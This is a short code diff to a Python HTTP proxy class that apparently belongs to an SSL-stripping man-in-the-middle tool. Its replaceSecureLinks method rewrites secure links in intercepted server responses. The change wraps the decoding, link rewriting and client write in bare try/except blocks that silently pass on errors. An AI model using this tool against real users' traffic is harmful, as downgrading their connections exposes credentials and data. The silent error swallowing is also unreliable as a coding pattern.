@@ -152,27 +152,27 @@ class ServerConnection(HTTPClient):
         logging.log(self.getLogLevel(), "Read from server:\n" + data)
 
         # CHANGE: decoding & encoding
-        decoded_data = data.decode('utf-8')
-        data = self.replaceSecureLinks(decoded_data).encode('utf-8')
+        # decoded_data = data.decode('utf-8')
+        # data = self.replaceSecureLinks(decoded_data).encode('utf-8')
         
         # CHANGE?: Try and except
-        # try: 
-        #     # CHANGE: decoding & encoding
-        #     decoded_data = data.decode('utf-8')
-        #     data = self.replaceSecureLinks(decoded_data).encode('utf-8')
-        # except:
-        #     pass
+        try: 
+            # CHANGE: decoding & encoding
+            decoded_data = data.decode('utf-8')
+            data = self.replaceSecureLinks(decoded_data).encode('utf-8')
+        except:
+            pass
 
         if (self.contentLength != None):
             # CHANGE: changed int to string
             self.client.setHeader('Content-Length', str(len(data)))
         
         # CHANGE?: Try and except
-        # try:
-        self.client.write(data)
-        self.shutdown()
-        # except:
-        #     pass
+        try:
+            self.client.write(data)
+            self.shutdown()
+        except:
+            pass
 
     def replaceSecureLinks(self, data):
         iterator = re.finditer(ServerConnection.urlExpression, data)
